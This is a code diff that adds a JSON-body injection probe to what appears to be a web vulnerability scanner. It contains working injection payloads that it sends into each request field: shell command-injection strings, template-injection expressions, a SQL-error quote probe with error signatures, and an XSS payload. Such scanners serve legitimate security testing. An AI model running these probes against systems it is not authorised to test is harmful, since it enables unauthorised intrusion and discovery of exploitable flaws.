@@ -167,6 +167,7 @@ async def run_tool(name: str, params: dict) -> dict:
         "idor_probe": _idor_probe,
         "ssrf_probe": _ssrf_probe,
         "cmdi_probe": _cmdi_probe,
+        "json_body_probe": _json_body_probe,
         "lfi_probe": _lfi_probe,
         "ssti_probe": _ssti_probe,
         "open_redirect_probe": _open_redirect_probe,
@@ -874,6 +875,139 @@ async def _cmdi_probe(url: str) -> dict:
         "tested_params": list(qs.keys()),
         "note": "In-band OS command injection confirmed via server-side arithmetic. RCE-class.",
     }
+
+
+async def _json_body_probe(url: str, body: dict, method: str = "POST") -> dict:
+    """Test a JSON REQUEST BODY for injection in each field. Modern APIs take
+    JSON in POST/PUT bodies, which the GET-param detectors never reach. For each
+    string/number field (flat or nested) we inject, one field at a time:
+      - cmdi arithmetic  (;echo $((a*b)))  -> product in response => RCE-class
+      - ssti arithmetic  ({{a*b}})         -> product => SSTI/RCE
+      - error-based SQLi (')               -> SQL error signature => SQLi
+      - XSS marker (flagged ONLY if reflected unescaped AND HTML content-type)
+    All proof-by-execution / signature — reflection-safe like the GET probes."""
+    import random
+    import secrets
+    import copy
+
+    if not url.startswith("http"):
+        url = f"http://{url}"
+    method = (method or "POST").upper()
+    if not isinstance(body, dict) or not body:
+        return {"url": url, "vulnerable": False, "note": "No JSON body fields to test."}
+
+    SQL_ERRS = ("sql syntax", "you have an error in your sql", "mysql_fetch",
+                "ora-0", "unclosed quotation", "quoted string not properly terminated",
+                "psql:", "sqlite3.", "syntax error at or near", "pg_query",
+                "sqlstate", "warning: mysqli", "unterminated quoted string")
+
+    # Collect paths to string/number leaves (flat + nested dicts/lists).
+    paths: list[list] = []
+    def _walk(node, path):
+        if isinstance(node, dict):
+            for k, v in node.items():
+                _walk(v, path + [k])
+        elif isinstance(node, list):
+            for i, v in enumerate(node):
+                _walk(v, path + [i])
+        elif isinstance(node, (str, int, float)) and not isinstance(node, bool):
+            paths.append(path)
+    _walk(body, [])
+
+    def _set(obj, path, val):
+        o = copy.deepcopy(obj)
+        ref = o
+        for p in path[:-1]:
+            ref = ref[p]
+        ref[path[-1]] = val
+        return o
+
+    def _get(obj, path):
+        ref = obj
+        for p in path:
+            ref = ref[p]
+        return ref
+
+    def _is_html(resp):
+        ct = resp.headers.get("content-type", "").lower()
+        return ("html" in ct) or (not ct)
+
+    findings = []
+    async with auth_client(timeout=10, follow_redirects=True, verify=False) as client:
+        async def send(payload_body):
+            return await client.request(method, url, json=payload_body)
+
+        try:
+            baseline = (await send(body)).text
+        except Exception:
+            baseline = ""
+        base_low = baseline.lower()
+
+        for path in paths[:25]:  # bound work on huge payloads
+            label = ".".join(str(p) for p in path)
+            orig = _get(body, path)
+            sorig = str(orig) if orig is not None else ""
+            a, b = random.randint(100000, 999999), random.randint(11, 97)
+            product = str(a * b)
+            hit = False
+
+            # cmdi (arithmetic, reflection-proof)
+            for inj in (f";echo $(({a}*{b}))", f"|echo $(({a}*{b}))",
+                        f"$(({a}*{b}))", f"`expr {a} \\* {b}`"):
+                try:
+                    r = await send(_set(body, path, sorig + inj))
+                    if product in r.text and product not in baseline:
+                        findings.append({"field": label, "class": "cmdi", "payload": inj,
+                                         "proof": f"shell evaluated {a}*{b}={product} server-side"})
+                        hit = True
+                        break
+                except Exception:
+                    pass
+            if hit:
+                continue
+
+            # ssti (arithmetic across template syntaxes)
+            for pl in (f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"#{{{a}*{b}}}", f"<%= {a}*{b} %>"):
+                try:
+                    r = await send(_set(body, path, pl))
+                    if product in r.text and product not in baseline:
+                        findings.append({"field": label, "class": "ssti", "payload": pl,
+                                         "proof": f"template engine evaluated {a}*{b}={product}"})
+                        hit = True
+                        break
+                except Exception:
+                    pass
+            if hit:
+                continue
+
+            # error-based SQLi (single quote provokes a DB error)
+            try:
+                r = await send(_set(body, path, sorig + "'"))
+                low = r.text.lower()
+                if any(s in low for s in SQL_ERRS) and not any(s in base_low for s in SQL_ERRS):
+                    findings.append({"field": label, "class": "sqli", "payload": "' (single quote)",
+                                     "proof": "single quote provoked a SQL error in the response"})
+                    hit = True
+            except Exception:
+                pass
+            if hit:
+                continue
+
+            # reflected XSS — only real if the body is rendered as HTML
+            m = "kx" + secrets.token_hex(3)
+            tail = "<svg/onload=alert(1)>"
+            try:
+                r = await send(_set(body, path, m + tail))
+                if m + tail in r.text and _is_html(r):
+                    findings.append({"field": label, "class": "xss", "payload": tail,
+                                     "proof": "marker reflected unescaped in an HTML response"})
+            except Exception:
+                pass
+
+    return {"url": url, "method": method, "vulnerable": len(findings) > 0,
+            "findings": findings,
+            "tested_fields": [".".join(str(p) for p in pp) for pp in paths],
+            "note": "JSON-body injection (cmdi/ssti/sqli/xss) — proof by execution/signature."}
 
 
 async def _ssrf_probe(url: str) -> dict:
